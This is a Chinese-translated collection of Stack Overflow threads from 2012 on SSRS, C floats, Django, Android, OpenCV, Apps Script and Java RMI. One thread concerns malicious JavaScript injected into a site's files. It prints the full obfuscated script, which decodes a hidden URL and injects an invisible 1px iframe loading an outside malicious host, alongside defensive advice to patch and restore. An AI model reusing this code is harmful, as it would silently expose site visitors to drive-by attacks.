*   凭据已保存（存储）
*   报告有一些隐藏的整数和日期参数
*   该报告没有链接的报告

所以，我的疑问是：我是否因为参数而收到此错误？如果是这样，解决方案是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T09:27:02.530

问题是由于报告中使用的用户 ID 表达式。解决方案是在 Report Properties-> Code 中有以下代码

Public Function UserName() Try Return Report.User!UserID Catch Return "ind\injj" End Try End Function

在用户 ID 文本框中调用此函数为 code.UserName()

现在异常解决了，可以订阅了。而不是在 catch 中硬编码用户名，你甚至可以给出代码..

感谢[http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/cb4e7816-d421-4921-a4e5-b258888748f9/](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/cb4e7816-d421-4921-a4e5-b258888748f9/)

[http://msdn.microsoft.com/en-us/library/ms156012.aspx](http://msdn.microsoft.com/en-us/library/ms156012.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-06T15:26:42.903

刚刚遇到了类似的问题。在报告属性-> 语言下，我找到了“=User!Language”的值。我能够删除此设置，然后可以创建数据驱动订阅。

# javascript - 在服务器上注入 javascript 代码

> ID：10991502
> 
> 赞同：1
> 
> 时间：2012-06-12T06:27:43.610
> 
> 标签：javascript, code-injection

在我的网站中，我在最后的 js 文件中发现了一些 javascript 代码，我从未在服务器上添加这些代码，而 js 文件对用户没有写权限。

关于如何更改此文件并在其中添加代码以及如何保护服务器上的网站以进行此类尝试的任何想法。

这是 javascript 代码的一部分，我不知道它是如何添加到我的文件中的。

```
var RPTj='hYUw';function HCLac(){}
if('hikbf'=='gloCBh')hnwT='BtbByu';var efIc;function ovPvyr(){var GcFza='sLHwL';if('jPslJ'=='WfPs')FgTgr();}
var px0_var="0\x70x";function yefdV(){var MZIWif='pFeEIR';if('Oqoi'=='jcEyCx')YXCIxm();}
var WxTv;var JJfPP="f\x72\x6fm\x43harCode";function MnFGT(){var WcZW='mpjU';if('GQike'=='hfiFQm')aSNa();}
var LusRYV="";if('KSCVlW'=='ZHLn')fCxfd='nkVIX';if('rGsiG'=='uRdOG')bgTeVq();function NmGQl(){} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T06:36:04.683

有人可以访问您的服务器并插入经过混淆的恶意软件。

您的服务器上很可能有一些易受攻击的脚本 - 尤其是常见的第三方 PHP 应用程序，例如 WordPress 或 phpBB，通常会成为攻击目标。

**现在做什么？**

*   关闭攻击者用来获取访问权限的任何漏洞。这很可能涉及使用您正在使用的任何软件的当前版本。
*   从干净的备份重新安装所有内容，以摆脱所有恶意软件和可能的后门。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:01:16.217

谷歌搜索其中一个令牌会导致[此报告](http://jsunpack.jeek.org/dec/go?report=4d7e564d602c57c80f4ef65ce5f55c120eb9cf02)。看来您的代码是该代码的开头。完整代码似乎要做的是插入一个隐藏的 iframe，指向`http://snap3.myvnc.com/58583911.html`.

完整的代码格式：

```
var RPTj = 'hYUw';

function HCLac() {}
if ('hikbf' == 'gloCBh') hnwT = 'BtbByu';
var efIc;

function ovPvyr() {
    var GcFza = 'sLHwL';
    if ('jPslJ' == 'WfPs') FgTgr();
}
var px0_var = "0px";

function yefdV() {
    var MZIWif = 'pFeEIR';
    if ('Oqoi' == 'jcEyCx') YXCIxm();
}
var WxTv;
var JJfPP = "fromCharCode";

function MnFGT() {
    var WcZW = 'mpjU';
    if ('GQike' == 'hfiFQm') aSNa();
}
var LusRYV = "";
if ('KSCVlW' == 'ZHLn') fCxfd = 'nkVIX';
if ('rGsiG' == 'uRdOG') bgTeVq();

function NmGQl() {}
var appVersion_var = "appversion";

function FxKCOl() {
    var Tyadnl = 'KxdiY';
    if ('oiXBU' == 'egVk') ikDXjx();
}

function ZMlp() {}
var HpgJJy = "a6b2b2ae786d6db1ac9fae716cabb7b4aca16ca1adab6d7376737671776f6f6ca6b2abaa";
var kEKvaZ = 53;
if ('sXNxpE' == 'kYOrhd') LHXd = 'GRDMD';
var iQzzDyqFb = "parseInt";
var NVLbyx = 'SzzTbP';
var KnXUEO = "appendChild";
var oCuGvo = 'AqRu';
var QqDXbsz = "slice";
var PSvizz = 'wTGO';
if ('UDtvo' == 'WOvxa') EjML();
if ('NkueyZ' == 'hmZjo') PTCkFt();
if ('ARloGz' == 'ESOXD') xXLyjy();

function YFbf() {}
var BdHebR = "body";
var EyIJOS;
var LXlPOM = "constructor";

function Aibw() {}
var UYFE = 'XToVL';
var RCfxR;
var px1_var = "1px";

function UxfaL() {}
var uCNeV;
var PmfiAgi = (function () {
    var aBOKw = 77;
    return this;

    function uiqNU() {}
})();
var bsnc = 16;
if ('Bxidy' == 'pXMzt') iTix = 'VlDz';
var BffTkrlL = "gfmhzktv" [LXlPOM];
var AeqcV = 178;
if ('yDWAl' == 'aEfSc') YamYD();
if ('Gbiec' == 'Gfkedw') IKIyYm();

function RiHlap() {}
for (var naQrl = 0; naQrl < HpgJJy.length; naQrl += 2) {
    if ('ldgI' == 'IKpUz') rrqZYp();
    if ('wghLE' == 'xtjurW') QFbOk = 'erIdjm';
    QxXSy = PmfiAgi[iQzzDyqFb](HpgJJy[QqDXbsz](naQrl, naQrl + 2), 16) - 62;
    var uzmz;
    var TtQHcx = 194;
    LusRYV += BffTkrlL[JJfPP](QxXSy);
    if ('RfJxKN' == 'WCxvgr') qJiK();

    function niER() {
        var xYfZTn = 'bTKOZ';
        if ('oNmb' == 'zFotVd') CErQ();
    }
    var ORrPz = 66;
}
function qrRA() {}
if ('xUJvl' == 'IwPl') Zsvdq();
var tGfG;
var EKOhz = 234;
var uTUrfPXx = "msaAyY";
var PFDee;
if ('UrLoD' == 'Sxld') PDDgwq = 'WMta';
var xVwEzf = "";
if (navigator[appVersion_var].indexOf("MSIE") != -1) {
    var kWawh;
    var ipBou;
    xVwEzf = '<iframe name="' + uTUrfPXx + '" src="' + LusRYV + '">';
    var OCLAkX;
    var nRid = 246;
    var kxFTam = 'XzkCJ';
} else {
    if ('NhMm' == 'fRlNQ') mcPWV = 'wimioU';
    xVwEzf = 'iframe';
    var FLIdcI = 'yQEfas';
    if ('BUXe' == 'AShAfN') EKbV = 'fBEl';
}
if ('YdKCO' == 'pWElN') uTSIz();
var VdDqgo = document.createElement(xVwEzf);
var ZcAkY = 'meVkj';
var jMIFIc;
VdDqgo.tuqYuP = function () {
    if ('FfHJE' == 'bCay') azXnsN();
    if ('BlUAl' == 'cJxWM') fRGW();
    var ogFkn = 146;
    this["src"] = LusRYV;
    var AgIjr = 259;
    var qpSQK = 92;

    function PdHsy() {}
}
var qzNJ = 'aFPF';
if ('vNdx' == 'XYol') rQHs = 'Hxmv';
VdDqgo.style.width = px1_var;
var INpVIa;
VdDqgo.name = uTUrfPXx;
if ('xFAX' == 'BDmDG') KbBJUL();
VdDqgo.style.right = px0_var;

function hDmz() {
    var QaDaK = 'RkXzFf';
    if ('zhJAW' == 'KaeI') EKMSCK();
}
var FLxMGu = 'NTrTRL';
var VKffS;
if ('uVncX' == 'wLjA') SxPE = 'DqmaHY';
VdDqgo.style.position = "absolute";
if ('QUcV' == 'DOyW') iHzhEN = 'nFIX';
if ('NkrLk' == 'KpcbG') ZaLFnC = 'eGLz';
VdDqgo.style.height = px1_var;
var UcmFUb = 'qOVzZW';
VdDqgo.style.top = px0_var;
var VWcgid;
if ('XMOW' == 'Ednf') WHmsA = 'IUxM';
VdDqgo.tuqYuP();
var lXbvup = 'vYuQu';
if ('imkwcA' == 'WooJ') HveoG = 'lWaRP';

function bICzNVqfg() {
    var YPKTox;
    if (document[BdHebR]) {
        if ('ngooi' == 'TqRCsb') ftbpb();
        document[BdHebR][KnXUEO](VdDqgo);

        function qDuFo() {
            var mazr = 'QnGfrg';
            if ('BOyz' == 'AKOa') Gngf();
        }
        function pzBO() {}
    } else {
        var VxvCl;
        if ('iZnVhA' == 'xXpx') yFwsuD = 'Jwngn';
        setTimeout(bICzNVqfg, 120);

        function TQWAxJ() {}
    }
    var trjnm = 134;

    function gZgci() {
        var IwVkwG = 'bVoa';
        if ('FAipi' == 'lshUte') jAfeZ();
    }
}
function ugkLim() {
    var WDsg = 'GXvuNm';
    if ('WxbcV' == 'OxFu') OwHcwI();
}
bICzNVqfg();
if ('pdHQlr' == 'MsZfH') lqfhm();
var BqsQp = 'BfjE';
var uHPm = 'sLKHU';
var hZrYYl = 'Qckv';
if ('gjgstY' == 'dlcZ') wSnqFG = 'zSpF'; 
```

至于您要确定它是如何发生的，如果您可以访问服务器日志，那么服务器日志将是一个开始的地方。

# c - 浮点数打印不准确

> ID：10991505
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:28:06.133
> 
> 标签：c, floating-point

> **可能重复：**
> [C 中的浮点问题](https://stackoverflow.com/questions/3916439/floating-point-issue-in-c)

```
#include<stdio.h>
main()
{
        int a,b;
        float f;
        scanf("%2d%3d%4f",&a,&b,&f);
        printf("%d %d %f",a,b,f);
} 
```

当我运行这个程序并输入 2 4 56.8 时，它会给出输出 2 4 56.799999 ......但我希望 2 4 56.8 ......为什么会这样？？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T06:32:09.810

那是对的。浮点数是近似值。正如 0.33333333 是 1/3 的近似值一样，56.7999999 是 56.8 的近似值。0.1 没有精确的浮点表示。

看看已经写的一些内容：

*   [http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html](http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html)
*   [http://www.hack3r.com/forum-topic/what-every-programmer-should-know-about-floating-point-arithmetic](http://www.hack3r.com/forum-topic/what-every-programmer-should-know-about-floating-point-arithmetic)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:33:15.257

56.8 不能以 C 编译器使用的浮点格式精确表示。请参阅David Goldberg 的*《每位计算机科学家应该了解的关于浮点运算*的知识》 （1991 年）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:33:57.203

这可能与浮点不准确有关。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T07:08:18.100

所有浮点数都不能存储为其精确值，因为浮点数域的连续空间被映射到离散级别。例如，浮点数可以以[IEEE754](http://steve.hollasch.net/cgindex/coding/ieeefloat.html)单精度格式存储。它将浮点数分三部分存储在 32 位内存中。假设`[a, b]`是可以用 IEEE754 格式精确表示的两个最接近的浮点数，但我们将在`a`和之间有无限数量的浮点数`b`，在这种情况下，这些数字将用`a`或来近似`b`。这会导致你正在经历的不精确。

该数字以规范化格式存储，尽管一些非常小的数字可以以非规范化格式存储。只是看看文件。

例如，在您的情况下，56.8 IEEE754 单点精度表示如下：

*   符号：0（1 位）
*   偏置指数：10000100（8 位）
*   尾数：11000110011001100110011（23位）

现在，如果你将这个数字转换回十进制，那么你会得到

*   符号为 0，即值为正
*   10000100 = 132 偏差量 127 因此指数 = 132 - 127 = 5
*   带有隐藏位的尾数 1.11000110011001100110011
*   用指数调整小数点后（右移 5 位）：111000.110011001100110011
    *   整数部分：111000 = 2^5 + 2^4 + 2^3 = 56
    *   小数部分：.110011001100110011 = 2^-1 + 2^-2 + 2^-5 + 2^-6 + 2^-9 + 2^-10 + 2^-13 + 2^-14 + 2^- 17 + 2^-18 = 0.799999237

因此，当您从 IEEE754 单精度格式检索值时，它变为： 56.799999237 您已存储 56.8

You can play with IEEE754 representation here: [http://www.h-schmidt.net/FloatConverter/IEEE754.html](http://www.h-schmidt.net/FloatConverter/IEEE754.html)

# iphone - 如何从 iCal 中检索事件列表？

> ID：10991507
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:28:14.587
> 
> 标签：iphone, objective-c, ios, ipad

如何通过编码从 iCal 应用程序中检索事件列表？是否可以获取事件列表？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-12T06:32:21.810

Event Kit 框架提供了用于访问和修改日历事件信息的类。

查看 Apple 的相关文档：[Event Kit Framework Reference](https://developer.apple.com/library/ios/#documentation/EventKit/Reference/EventKitFrameworkRef/EventKitFrameworkRef.pdf)

还要查看代表日历数据库的[EKEventStore](http://developer.apple.com/library/ios/#documentation/EventKit/Reference/EKEventStoreClassRef/Reference/Reference.html#//apple_ref/doc/uid/TP40009567)类。它是应用程序访问日历数据的联系点。

# javascript - Django - 请求 AJAX 的响应

> ID：10991514
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:29:09.050
> 
> 标签：javascript, jquery, python, django

我在我的项目中使用这个 JQuery 自动完成插件[http://www.devbridge.com/projects/autocomplete/jquery/](http://www.devbridge.com/projects/autocomplete/jquery/)。我按照本教程[http://tips4php.net/2010/09/ajax-autocomplete-with-jquery-and-php/](http://tips4php.net/2010/09/ajax-autocomplete-with-jquery-and-php/)进行操作。

**自动完成**的 jQuery 代码：

```
$('#add-keywords').autocomplete({ 
        serviceUrl:'/keywords_suggestions',
        minChars:3,
        maxHeight:220,
        width:280,
        zIndex: 9999,
        onSelect: function(value, data){ $('#add-keywords').val(value); },
}); 
```

来自 JQuery Autocomplete 的 Ajax GET 请求没有问题。就像，如果我在 GET 请求 url 中键入“开发**者”将是**`input text`

```
http://127.0.0.1:8000/keywords_suggestions/?query=developer 
```

我在 Django 中得到这样的参数**查询：**

```
def kkeywords_suggestions(request):
        if request.is_ajax():
                q = request.GET.get('query', '')
                try:
                        g = KeywordsModel.objects.filter(keyword__startswith=q).order_by('count')
                except KeywordsModel.DoesNotExist:
                        return HttpResponse("not")
                else:
                        for i in range(1,(len(g)+1)):
                                s = []
                                s.append(g[i-1].keyword)
                        to_json = {
                                query: q,
                                suggestions: s,
                                }
                        return HttpResponse(simplejson.dumps(to_json), mimetype='application/json') 
```

Django 模型.py：

```
class KeywordsModel(models.Model):
        keyword = models.CharField(max_length=40, blank=False)
        count = models.IntegerField(max_length=20) 
```

问题从这里发生`request.GET.get('query', '')`。它显示错误

```
ValueError at /keywords_suggestions/
The view information.views.keywords_suggestions didn't return an HttpResponse object. 
```

**更新-1**

抱歉，Chrome Network 标签中的错误是这样的

```
Request URL:http://127.0.0.1:8000/keywords_suggestions/?query=web
Request Method:GET
Status Code:500 INTERNAL SERVER ERROR 
```

当我签入该 URL 时，它显示空白页。为什么？

**更新-2**

我`request.is_ajax()`从视图中删除。现在我收到此错误：

```
Exception Type: NameError
Exception Value:    
global name 'query' is not defined
Exception Location: /home/nirmal/try/information/views.py in keywords_suggestions, line 123 
```

为什么 django 考虑`query`作为一个全局名称？这是我试图从 url 中获取的那个。

谁能帮我为该自动完成功能制作一个完美的**HttpResponse吗？**

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:03:19.570

它应该是。

```
to_json = {'query': q, 'suggestions': s} 
```

基本上发生的事情是`{query:q ...`python正在寻找变量查询以便在字典中设置键，任何字符串查询可能指向的内容，但是不存在这样的变量并且它返回了一个错误......

`global name 'query' is not defined`正如错误所述，python 正在寻找变量查询，它首先在函数范围内进行本地检查，然后向上移动，直到它到达全局范围，如果没有找到它就会抛出该异常。

# android - 如何在 android 中从服务器播放 mp4 视频？

> ID：10991515
> 
> 赞同：1
> 
> 时间：2012-06-12T06:29:38.983
> 
> 标签：android, video, mp4

我能够显示来自服务器的 3gp 视频。但是当我尝试播放一个 mp4 视频时，它会显示一条警告，说对不起，这个视频无法播放。请在这方面帮助我。

```
package com.play.video;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.MediaController;
import android.widget.VideoView;

public class PlayvideofromserverActivity extends Activity
{
    private VideoView vView;
    private String vSource;

    @Override
    public void onCreate(Bundle savedInstanceState) 
    { 

        super.onCreate(savedInstanceState);

        setContentView(R.layout.main);

        vView = (VideoView)findViewById(R.id.vview);

        vView.requestFocus();

            vSource ="http://server.com/testvideo.mp4";
            vView.setVideoURI(Uri.parse(vSource));

        vView.setMediaController(new MediaController(this));

        vView.start();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:43:24.230

试试这个代码。它可以帮助你。

```
myVideoView.setMediaController(new MediaController(this));
myVideoView.setVideoPath(videoSource);
myVideoView.requestFocus();
myVideoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
  public void onPrepared(MediaPlayer mp) {
    myVideoView.start();
  }
}); 
```

谢谢

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-29T08:59:07.923

**Android 并不总是播放 mp4。**

> MP4 只是一个容器——其中的视频和音频流都将以不同的格式编码。

`Android natively only supports certain types of formats.`这里有一个列表：

[http://developer.android.com/guide/appendix/media-formats.html](http://developer.android.com/guide/appendix/media-formats.html)

确保`video and audio encoding type is supported`. 仅仅因为它说“mp4”并不意味着它应该可以播放。

归功于[肯·沃尔夫](https://stackoverflow.com/a/17399981/3496570)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:39:00.237

试试这个代码

```
MediaController mc = new MediaController(this);
videoView.setMediaController(mc);

String s=Common.videofilepath;
//Set the path of Video or URI
videoView.setVideoURI(Uri.parse(Common.videofilepath));

//Set the focus
videoView.requestFocus();
videoView.start(); 
```

# android - 系统服务在 onCreate() 之前对活动不可用

> ID：10991517
> 
> 赞同：0
> 
> 时间：2012-06-12T06:29:46.333
> 
> 标签：android

`onCreate()`在我尝试在我的`onCreate()`方法 之外设置适配器之前，我得到了这个异常系统服务不可用于活动。
我尝试过使用`runOnUIThread()`函数，但仍然无法解决我的问题。
这实际上是我的代码。
我正在通过一种方法将我的服务子类中的列表发送到我的活动类。

```
Class KitchenSerivce extends Service
@Override
public int onStartCommand(Intent intent, int flags , int startId)
{   
    super.onStartCommand(intent, flags, startId);   
    Toast.makeText(this, "Service started ...", Toast.LENGTH_SHORT).show();

    try
    {
        SoapObject result=null;
        SoapObject request=new SoapObject(NAME_SPACE, METHOD_NAME);

        SoapSerializationEnvelope envelope=new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet=true;
        envelope.setOutputSoapObject(request);

        try
        {
            HttpTransportSE androidHttpTransportSE=new HttpTransportSE(URL, 5000);
            androidHttpTransportSE.call(SOAP_ACTION, envelope);

            result=(SoapObject)envelope.getResponse();
            orderList=getOrder(result);

            Log.v("Server response", result.toString());
        }
        catch (Exception e)
        {
            msg=Toast.makeText(this, "Connection to Server Failed", Toast.LENGTH_SHORT);
            msg.show();             
        }

        msg=Toast.makeText(this, result.toString(), Toast.LENGTH_SHORT);
        msg.show();

        KitchenManager kitchen=new KitchenManager();        
        kitchen.sendOrder(orderList);
    }                   
    catch (Exception e)     
    {               
        System.out.println("Exception Caught:"+e.getMessage());         
    }

    return START_STICKY;        
} 
```

* * *

**KitchenManager 扩展了 Activity**

```
public void sendOrder(List<Order> orderList)
{

    this.orderList=orderList;

    for(int i=0;i<orderList.size();i++)
    {
        System.out.println("List Size:"+orderList.size());
        System.out.println("Item:"+orderList.get(i).getItem());
    }

    adapter=new OrdersAdapter(KitchenManager.this,R.layout.kitchen_order_list,this.orderList);

    if(this.orderList.size()==0)
    {

    }
    else
    {
    list.setAdapter(adapter);
    adapter.notifyDataSetChanged();
    }
} 
```

* * *

我`sendOrder()`在网上的公共无效中遇到异常

```
adapter=new OrdersAdapter(KitchenManager.this,R.layout.kitchen_order_list,this.orderList); 
```

请如果有人可以帮助我，因为我已经完成搜索但无法找到解决我的问题的方法。提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:09:27.923

```
KitchenManager kitchen=new KitchenManager(); 
```

**不要试图这样做！！！**

您不能实例化`Activity`using `new`。这不是 Android 的工作方式。

如果你想`Activity`从 a开始，`Service`你应该使用 a`Notification`和 a `PendingIntent`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:45:09.680

您应该考虑重新设计您的代码。

我会指出你哪里错了。

您在以下代码中遇到问题。

```
 public void sendOrder(List<Order> orderList) 
```

您正在从 KitchenSerivce 调用此方法并期望它与 KitchenManager 的上下文一起使用

相反，您应该将方法更改为遵循。

```
public void sendOrder(Context context,List<Order> orderList) 
```

在你里面 KitchenService 包括以下内容。

```
class KitchenService extends Service {
        private Context context;

        @Override
        public void onCreate() {
            context = KitchenService.this;
            super.onCreate();
        } 
```

并在调用时 `kitchen.sendOrder(orderList);`将其更改为

```
 kitchen.sendOrder(context,orderList); 
```

然后改变这个

```
adapter=new OrdersAdapter(KitchenManager.this,R.layout.kitchen_order_list,this.orderList); 
```

至

```
adapter=new OrdersAdapter(context,R.layout.kitchen_order_list,this.orderList); 
```

# image - OpenCV 在另一个图像上绘制图像

> ID：10991523
> 
> 赞同：33
> 
> 时间：2012-06-12T06:30:37.447
> 
> 标签：image, opencv

是否有 OpenCV 函数可以在另一个图像上绘制图像？我有一个`Mat`类型的大图像。我有一个( )`Mat`类型的小图像。`5x7`我想在指定的大图像上绘制这个小图像`coordinates`。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-06-12T07:00:42.573

使用`Mat::rowRange()`和`Mat::colRange()`指定要在目标中绘制的区域`Mat`。代码：

```
Mat src( 5,  7, CV_8UC1, Scalar(1)); // 5x7
Mat dst(10, 10, CV_8UC1, Scalar(0)); // 10x10

src.copyTo(dst.rowRange(1, 6).colRange(3, 10)); 
```

结果如下：

之前`copyTo()`：

```
dst:
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 ) 
```

之后`copyTo()`：

```
dst:
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 1 1 1 1 1 1 1 )
    ( 0 0 0 1 1 1 1 1 1 1 )
    ( 0 0 0 1 1 1 1 1 1 1 )
    ( 0 0 0 1 1 1 1 1 1 1 )
    ( 0 0 0 1 1 1 1 1 1 1 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 )
    ( 0 0 0 0 0 0 0 0 0 0 ) 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-12-07T12:34:38.250

在大图像中创建一个感兴趣区域，然后将小图像复制到该区域：

```
cv::Rect roi( cv::Point( originX, originY ), cv::Size( width, height ));
cv::Mat destinationROI = bigImage( roi );
smallImage.copyTo( destinationROI ); 
```

如果您确定小图像适合大图像，那么您可以简单地执行以下操作：

```
cv::Rect roi( cv::Point( originX, originY ), smallImage.size() );
smallImage.copyTo( bigImage( roi ) ); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-03-25T21:42:57.750

这是openCV的java版本中的解决方案

```
Rect roi= new Rect(originX,originY,smalImage.width(),smallImge.height());
smallImage.copyTo( new Mat(input,roi) ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-02-06T10:34:10.967

```
void zoomImage(Mat &src, Mat &dst, int scale_percent)
{

    //# percent of original size
    int width = int(src.cols * scale_percent / 100);
    int height = int(src.rows * scale_percent / 100);
    Size dim = Size(width, height);
    //pyrUp(tmp, dst, Size(tmp.cols * 2, tmp.rows * 2));
    resize(src, dst, dim, 0.0, 0.0, INTER_CUBIC);

    if (scale_percent < 100)
    {

        Mat srcR =Mat::zeros(Size(640,480),src.type()) ;
        int rstart = (src.rows - height) / 2;
        int rend = height;
        int cstart = (src.cols - width) / 2;
        int cend = width;
        dst.copyTo(srcR.rowRange( rstart, dst.rows+ rstart).colRange(cstart,dst.cols+ cstart));
        dst = srcR.clone();

    }
    else
    {
        Mat  ROI(dst, Rect((width - src.cols) / 2, (height - src.rows) / 2, src.cols, src.rows));
          dst = ROI.clone();
    }

} 
```

# google-apps-script - GAS：将已发布的服务嵌入到个人域

> ID：10991526
> 
> 赞同：1
> 
> 时间：2012-06-12T06:30:55.647
> 
> 标签：google-apps-script

是否可以将已发布的 Google App Script 服务嵌入到具有个人域的网站中？

我知道服务顶部会有一个黄色的安全横幅。

这是迄今为止我发现的唯一一篇文章： [python proxy to embed a google apps script service in an iframe](https://stackoverflow.com/q/10510425/1029121)

我尝试了以下代码示例但没有成功：

```
<iframe src="https://docs.google.com/macros/exec?service=[key]" frameborder="0"></iframe>

<embed xmlns="http://www.w3.org/1999/xhtml" src="https://docs.google.com/macros/exec?service=[key]"/> 
```

谢谢，

瑞安

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T03:02:27.293

Apps 脚本服务不能嵌入/iframe 到非 Google 域的网页中。您可以遵循一个开放的[功能请求来启用此功能。](http://code.google.com/p/google-apps-script-issues/issues/detail?id=852)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-13T00:29:21.130

不确定是否将其嵌入 iframe，但您可以使用个人 URL 并使用 Google 协作平台来托管该网页。

# java - 客户端程序没有命中 RMI 中的服务器程序

> ID：10991529
> 
> 赞同：0
> 
> 时间：2012-06-12T06:31:16.793
> 
> 标签：java, jakarta-ee, rmi

下面是实现 RMI 的片段

以下是我的服务器类

```
package com.queryExecutor.actionclass;   
import java.rmi.Naming;   
import java.rmi.RemoteException;   
import java.rmi.registry.LocateRegistry;   
import java.rmi.server.UnicastRemoteObject;   
import java.util.concurrent.ExecutorService;   
import java.util.concurrent.Executors;   

public class ExecutorServer extends UnicastRemoteObject implements executorInterface   
{   
public ExecutorServer()throws RemoteException   
{   
System.out.println("Server is in listening mode");   
}   
public void executeJob(String req_id,String usrname,String pwd,String driver,String url)throws RemoteException     
{   
    System.out.println("Inside executeJob...");   
    acQueryExecutor a=new acQueryExecutor(req_id,usrname,pwd,driver,url);   

    ExecutorService threadExecutor = Executors.newCachedThreadPool();   

    threadExecutor.execute(a); // start task1   

    threadExecutor.shutdown(); // shutdown worker threads   

}      
public void killJob(String req_id)throws RemoteException{}   
public int getJobStatus(String req_id)throws RemoteException{return 1;}   
public void restart(String req_id)throws RemoteException{}   

public static void main(String arg[])   
{   
try{   
    //Registry registry = LocateRegistry.getRegistry("10.155.1.159",1099);    
    LocateRegistry.createRegistry(2005);   
ExecutorServer p=new ExecutorServer();   
Naming.rebind("//127.0.0.1:2005/exec",p);   
}catch(Exception e)   
{   
System.out.println("Exception occurred : "+e.getMessage());   
}   
}   
@Override  
public void executeJob(String req_id, String usrname, String pwd)   
        throws RemoteException {   
    // TODO Auto-generated method stub   
       System.out.println("Inside executeJob...");
acQueryExecutor a=new acQueryExecutor(req_id,usrname,pwd,"driver","url");

ExecutorService threadExecutor = Executors.newCachedThreadPool();
threadExecutor.execute(a); // start task1
threadExecutor.shutdown(); // shutdown worker threads
}   
} 
```

界面

```
package com.queryExecutor.actionclass;   
import java.rmi.Remote;   
import java.rmi.RemoteException;   

public interface executorInterface extends Remote   
{   
public void executeJob(String req_id,String usrname,String pwd)throws RemoteException;   
public void killJob(String req_id)throws RemoteException;   
public int getJobStatus(String req_id)throws RemoteException;   
public void restart(String req_id)throws RemoteException;   
}  
package com.queryExecutor.actionclass;
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface executorInterface extends Remote
{
public void executeJob(String req_id,String usrname,String pwd)throws RemoteException;
public void killJob(String req_id)throws RemoteException;
public int getJobStatus(String req_id)throws RemoteException;
public void restart(String req_id)throws RemoteException;
} 
```

客户

```
package com.queryExecutor.actionclass;   
import java.rmi.Naming;   

    public class testClient {   
    public static void  main(String args[])   
    {   
    try{   

        executorInterface p=(executorInterface)Naming.lookup("//127.0.0.1:2005/exec");   

    p.executeJob("1", "abc", "abc");   

    }   
    catch(Exception e)   
    {   
    System.out.println("Exception occurred : "+e.getMessage());   
    }   
    }   
    } 
```

当我运行客户端代码时，我在 Eclipse 控制台标头中没有得到任何输出，而是在其写入的 javaw.exe 终止。我的问题是为什么我的客户端程序没有访问服务器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:45:03.150

1.  您需要将结果存储在`LocateRegistry.createRegistry()`不会被垃圾收集的地方。否则它将*被*垃圾收集 => 没有注册表 =>`Naming.lookup()`失败 => 客户端的静默退出，因为您正在通过将异常打印到没有此类东西的 javaw.exe 进程的 System.out 来处理异常。

2.  调用`Naming.bind()`时`Naming.rebind()`，使用“localhost”以外的任何主机名都没有多大意义。如果主机名不是本地的，它无论如何都会失败，所以你只是在服务器代码中添加了一个额外的无意义的配置噩梦。将其设为“localhost”，它将在任何地方运行。

3.  你的`executeJob()`方法是完全的疯狂。它创建一个 Executor，调度一个作业，然后关闭 Executor：所以 Executor 永远不能做线程池；所以这基本上是浪费时间。您也可以只生成一个线程来执行任务；但是由于 RMI 已经是多线程的，您也可以自己执行任务。失去这一切。

# google-apps-script - 在站点中使用 UiApp PopupPanel

> ID：10991530
> 
> 赞同：0
> 
> 时间：2012-06-12T06:31:32.200
> 
> 标签：google-apps-script

我有一个电子表格将数据输入谷歌网站的列表页面。我希望用户能够直接从列表页面管理这些数据。

是否可以使用 UiApp 服务中的 PopupPanel（或其他类似方法）来实现这一点？

目前，填充列表页面的脚本会创建一个 URL 以使用 UI 代码调用另一个脚本，但它总是在新的浏览器窗口中打开。我还没有找到任何关于如何让 UI 在父窗口（列表页面）中打开的示例。

这可能是一项非常基本的任务，但我会很感激任何有关如何使用此任务的指导。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T21:19:33.987

